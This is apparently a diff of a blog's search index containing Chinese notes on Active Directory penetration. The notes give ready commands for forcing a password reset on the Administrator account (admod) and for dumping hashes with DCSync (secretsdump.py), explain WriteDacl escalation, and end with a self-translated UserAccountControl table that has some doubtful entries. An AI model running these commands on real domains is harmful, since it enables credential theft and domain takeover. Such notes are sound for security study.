+<h4 id="User-Force-Change-Password"><a href="#User-Force-Change-Password" class="headerlink" title="User-Force-Change-Password"></a>User-Force-Change-Password</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">0299570-246d-11d0-a768-00aa006e0529</span><br></pre></td></tr></table></figure>
+<p>可以在不知道当前目标用户的密码的情况下更改目标用户的密码</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">admod  -b CN&#x3D;Administrator,CN&#x3D;Users,DC&#x3D;test,DC&#x3D;local unicodepwd::123!@#qazwsx -optenc</span><br></pre></td></tr></table></figure>
+<h4 id="Dcsync"><a href="#Dcsync" class="headerlink" title="Dcsync"></a>Dcsync</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">DS-Replication-Get-Changes</span><br><span class="line">1131f6aa-9c07-11d1-f79f-00c04fc2dcd2</span><br><span class="line"></span><br><span class="line">DS-Replication-Get-Changes-All</span><br><span class="line">1131f6ad-9c07-11d1-f79f-00c04fc2dcd2</span><br></pre></td></tr></table></figure>
+<p>对域对象具有这两个扩展权限的用户具备dcsync 权限</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">python secretsdump.py exp.com&#x2F;cs:123456@dc.exp.com -dc-ip 10.0.2.254 -just-dc-user administrator</span><br></pre></td></tr></table></figure>
+<h4 id="WriteDacl"><a href="#WriteDacl" class="headerlink" title="WriteDacl"></a>WriteDacl</h4><p>将新ACE写入目标对象的DACL的功能。</p>
+<p>例如，攻击者可以向目标对象DACL写入新的ACE，从而使攻击者可以“完全控制”目标对象直接dcsync</p>
+<h1 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h1><h2 id="UserAccountControl值参考表"><a href="#UserAccountControl值参考表" class="headerlink" title="UserAccountControl值参考表"></a>UserAccountControl值参考表</h2><p>来源<a href="http://woshub.com/decoding-ad-useraccountcontrol-value/">http://woshub.com/decoding-ad-useraccountcontrol-value/</a></p>
+<p>自己翻译的，可能不太对</p>
+<table>
+<thead>
+<tr>
+<th align="center">SCRIPT</th>
+<th>1</th>
+<th>运行登录脚本</th>
+</tr>
+</thead>
+<tbody><tr>
+<td align="center">ACCOUNTDISABLE</td>
+<td>2</td>
+<td>账号已禁用</td>
+</tr>
+<tr>
+<td align="center">HOMEDIR_REQUIRED</td>
+<td>8</td>
+<td>依赖家目录</td>
+</tr>
+<tr>
+<td align="center">LOCKOUT</td>
+<td>16</td>
+<td>账户已锁定</td>
+</tr>
+<tr>
+<td align="center">PASSWD_NOTREQD</td>
+<td>32</td>
+<td>不需密码</td>
+</tr>
+<tr>
+<td align="center">PASSWD_CANT_CHANGE</td>
+<td>64</td>
+<td>用户不能更改密码</td>
+</tr>
+<tr>
+<td align="center">ENCRYPTED_TEXT_PWD_ALLOWED</td>
+<td>128</td>
+<td>使用可逆加密存储密码</td>
+</tr>
+<tr>
+<td align="center">TEMP_DUPLICATE_ACCOUNT</td>
+<td>256</td>
+<td>用户的帐户，其主要帐户在另一个域中</td>
+</tr>
+<tr>
+<td align="center">NORMAL_ACCOUNT</td>
+<td>512</td>
+<td>默认帐户，典型的活动帐户</td>
+</tr>
+<tr>
+<td align="center">INTERDOMAIN_TRUST_ACCOUNT</td>
+<td>2048</td>
+<td>域间信任</td>
+</tr>
+<tr>
+<td align="center">WORKSTATION_TRUST_ACCOUNT</td>
+<td>4096</td>
+<td>工作组信任</td>
+</tr>
+<tr>
+<td align="center">SERVER_TRUST_ACCOUNT</td>
+<td>8192</td>
+<td>服务器信任</td>
+</tr>
+<tr>
+<td align="center">DONT_EXPIRE_PASSWORD</td>
+<td>65536</td>
+<td>密码未过期的用户帐户</td>
+</tr>
+<tr>
+<td align="center">MNS_LOGON_ACCOUNT</td>
+<td>131072</td>
+<td>要登录网络，用户需要智能卡</td>
+</tr>
+<tr>
+<td align="center">SMARTCARD_REQUIRED</td>
+<td>262144</td>
+<td>需要智能卡</td>
+</tr>
+<tr>
+<td align="center">TRUSTED_FOR_DELEGATION</td>
+<td>524288</td>
+<td>非约束委派</td>
+</tr>
+<tr>
+<td align="center">NOT_DELEGATED</td>
+<td>1048576</td>
+<td></td>
+</tr>
+<tr>
+<td align="center">USE_DES_KEY_ONLY</td>
+<td>2097152</td>
+<td>仅使用DES密码</td>
+</tr>
+<tr>
+<td align="center">DONT_REQ_PREAUTH</td>
+<td>4194304</td>
+<td>不需要Kerberos预身份验证</td>
+</tr>
+<tr>
+<td align="center">PASSWORD_EXPIRED</td>
+<td>8388608</td>
+<td>用户密码已过期</td>
+</tr>
+<tr>
+<td align="center">TRUSTED_TO_AUTH_FOR_DELEGATION</td>
+<td>16777216</td>
+<td>约束委派</td>
+</tr>
+<tr>
+<td align="center">PARTIAL_SECRETS_ACCOUNT</td>
+<td>67108864</td>
+<td>受保护的账户</td>
+</tr>
+</tbody></table>
+<p>后续再补充补充。</p>
+]]></content>
+      <categories>
+        <category>笔记</category>
+      </categories>
+      <tags>
+        <tag>域渗透</tag>
       </tags>
   </entry>
 </search>
